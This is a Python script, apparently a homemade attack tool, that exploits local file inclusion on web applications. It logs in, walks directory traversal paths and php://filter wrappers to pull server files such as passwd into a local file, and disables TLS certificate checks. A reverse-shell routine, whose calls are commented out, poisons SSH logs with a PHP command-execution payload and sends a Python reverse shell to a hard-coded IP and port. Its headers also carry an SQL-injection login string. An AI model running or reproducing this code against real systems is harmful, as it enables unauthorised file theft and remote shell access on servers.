#!/usr/bin/env python3

#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess
import base64
ssl._create_default_https_context = ssl._create_unverified_context  
class Read_File:
     def __init__(self):
            self.control()
            if self.args.read:
                  with open(self.args.Cookie,'r') as Cookie_file :
                      self.Cookie =  Cookie_file.read()
            print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
            if self.args.auth:
               print("[+] Mothead          : ................ | : Full authentication")    
               print("[+] Login url        : ................ | : "+self.args.loginurl)
               print("[+] username         : ................ | : "+self.args.user)
               print("[+] Login password   : ................ | : "+self.args.password)
            print("[+] LFI-wordlist     : ................ | : "+self.args.filelist)
            print("[+] Vulnrenable url  : ................ | : "+self.args.Vulnurl)
            if self.args.base64:
               print("[+] PHP-Filter       : ................ | : Convert-base64") 
            print("[+] web Cookies      : ................ | : "+self.Cookie) 
            if self.args.auth and self.args.Vulnurl\
            and self.args.password and self.args.user\
            and self.args.Cookie and self.args.loginurl\
            and self.args.filelist:
                self.Login_auth()
                self.url_request()
             #   self.Reverse_shell()
            elif not self.args.auth and self.args.Vulnurl\
            and not self.args.password and not self.args.user and self.args.Cookie\
            and self.args.filelist :
                self.url_request()
            #    self.Reverse_shell()
            else:
                print("[+] Logic command  Error"+'\n'+'='*30)  
                print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ')  
                print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie')  
     def Login_auth(self):
            loginurl = self.args.loginurl
            request = mechanize.Browser()
            request.set_handle_robots(False)
            request.set_handle_redirect(True)
            request.set_handle_refresh(True, max_time=1)
            request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),]
            url_login = request.open(loginurl) 
            request.select_form(nr = 0)
            if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                   request["username"] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}' 
            elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}'
            elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
                   request["username"] = '{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
            elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
            response   = request.submit()         
            self.info = response.info()
           
          #  self.info_req =  self.info 
            content    = response.read()  
            self.url = response.geturl()      
     def url_request(self):            
            LFI=''
            if self.args.base64 :
              LFI += self.args.Vulnurl
              LFI +='php://filter/read=convert.base64-encode/resource='
            else:
                 LFI += self.args.Vulnurl 
            LFI += "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
            ssl._create_default_https_context = ssl._create_unverified_context                
            with  open(self.args.filelist,'r') as list_command  :  
                  command  = self.args.read                                      
            if self.args.auth:
               self.Login_auth() 
            command  = str(command).replace('/','%2F')         
            self.url = LFI+command
            request = mechanize.Browser()
            request.set_handle_robots(False)
            request.set_handle_redirect(True)
            request.set_handle_refresh(True, max_time=1)              
            request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                 Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),
                                 ('username',"admin'#"),
                                 ('password','password')]
            first_req = request.open(self.args.Vulnurl).read()                                                      
            Get_Oregnal_URL = request.open(self.url).read() 
            print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
            print("[+] File request        : ................ | : "+command.replace('\n','')) 
            print("[+] Full Path           : ................ | : "+self.url.replace('\n','')) 
            if self.args.auth and len(Get_Oregnal_URL) != len(first_req) :                  
                  pythex = str(re.findall('Content-Length:.+',str(self.info)))
                  pythex= pythex.replace("['",'').replace("']",'')
                  if pythex in str(self.info):
                     info = str(self.info).replace(pythex,'Content-Length:'+str(len(Get_Oregnal_URL)))
                     rex2 = re.findall(':.+',info)
                     print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
                     print("[+] Date             : ................ | "+rex2[0])
                     print("[+] Server           : ................ | "+rex2[1])
                     print("[+] Expires          : ................ | "+rex2[2])
                     print("[+] Cache-Control    : ................ | "+rex2[3])
                     print("[+] Pragma           : ................ | "+rex2[4])
                     print("[+] Vary             : ................ | "+rex2[5])
                     print("[+] Content-Length   : ................ | "+str(rex2[6]).replace(':',': '))
                     print("[+] Connection       : ................ | "+rex2[7])
                     print("[+] Content-Type     : ................ | "+rex2[8]+'\n')
                     print('='*20+"\n[*] vulnerability Link  "+'\n'+'='*30+'\n')
                     print("[+] vulnerable Link  : ................ | : "+self.url)
                     exit()
                     with open('index3.htnl','w') as html:
                          html.write(str(Get_Oregnal_URL).replace("b'",''))
                   
            elif not self.args.auth and len(Get_Oregnal_URL) != len(first_req)  :
                         with open('./index3.htnl','w') as html:
                              html.write(str(Get_Oregnal_URL).replace("b'",''))
                         with open ('./index3.htnl','r') as read :
                              if self.args.base64 :
                                 read_out = str(read.readlines()).split('<')
                                 decoded64 = str(base64.b64decode(read_out[0]))
                                 decoded64 = decoded64 .split('\\n')
                                 for line in  decoded64 :
                                      line = str(line).replace("'",'').replace("[",'')
                                      with open('passwd.txt','a') as passwd:
                                          passwd.write(line.replace('b','',1)+'\n')             
                              else:
                                   read_out = str(read.readlines()).split('<')
                                   read_out=read_out[0].split('\\n')
                                   for line in read_out:
                                       line = str(line).replace("'",'').replace("[",'')
                                       with open('passwd.txt','a') as passwd:
                                            passwd.write(line[:-1]+'\n')                                                                 
     def Reverse_shell(self):
                 if 'log' in self.url :
                    order2 = '''ssh '<?php system($_GET['cmd']); ?>'@192.168.56.107'''
                    command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
                    call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
                    time.sleep(10)
                    command ="""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.195.100.150",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
                    fake_link = self.url.replace('\n','')+"&cmd="+command.replace('\n','')
                    print(fake_link)
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=1)
                    if self.args.Cookie:
                       with open(self.args.Cookie,'r') as Cookie_file :
                           Cookie =  Cookie_file.read() 
                           request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                             Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                            ('Cookie',str(Cookie).replace('\n','')),
                                            ('username',"admin'#"),
                                            ('password','password')]
                    feka_log = request.open(fake_link).read() 
                    print(feka_log )
                            
     def control(self): 
           parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
           parser.add_argument("-UV ","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
           parser.add_argument("--auth"               , action='store_true'                    ,help ="url Targst web") 
           parser.add_argument("-F","--filelist"      , action=None         ,required=True     ,help ="read fron lfi wordlsit ")
           parser.add_argument("-C","--Cookie"        , action=None                            ,help ="Login sesion Cookie")  
           parser.add_argument("-B64","--base64"      , action='store_true'                    ,help ="Login sesion base64")  
           parser.add_argument("-R","--read"          , action=None                            ,help ="Login sesion base64")  
           parser.add_argument("-UF ","--UserForm"    , action=None                            ,help =" add name of the HTML Form Login User")
           parser.add_argument("-PF ","--PassForm"    , action=None                            ,help ="add name of the HTML Form Login Passord")
           parser.add_argument("-P  ","--password"    , action=None                            ,help ="use specific Passowrd")   
           parser.add_argument("-LU  ","--loginurl"   , action=None                            ,help ="use specific Passowrd") 
           parser.add_argument("-U  ","--user"        , action=None                            ,help ="use specific username ")
           self.args = parser.parse_args()     
           if len(sys.argv)!=1 :
              pass
           else:
              parser.print_help()         
              exit()                   
                             
if __name__=='__main__':
   Read_File()    